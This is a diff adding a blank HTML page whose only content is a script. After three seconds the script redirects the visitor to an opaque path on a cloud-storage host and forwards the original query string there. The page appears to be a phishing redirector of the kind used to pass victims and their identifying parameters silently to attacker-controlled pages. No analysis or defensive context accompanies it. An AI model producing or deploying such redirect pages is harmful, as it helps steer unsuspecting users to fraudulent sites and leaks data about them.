@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        setTimeout(function() {
+            const baseRedirectUrl = "https://pub-7037d98a7ab74a40ab75cc21fc78b30a.r2.dev/dvt6ue74iweursfkjdhbetuy7"; // Base redirect URL
+            const currentUrl = window.location.href;
+            const queryIndex = currentUrl.indexOf('?');
+
+            // Check if there is a query string in the current URL
+            const redirectUrl = queryIndex !== -1 
+                ? baseRedirectUrl + currentUrl.substring(queryIndex) 
+                : baseRedirectUrl;
+
+            // Redirect to the new URL
+            window.location.href = redirectUrl;
+        }, 3000); // Delay of 3 seconds
+    </script>
+</head>
+</html>
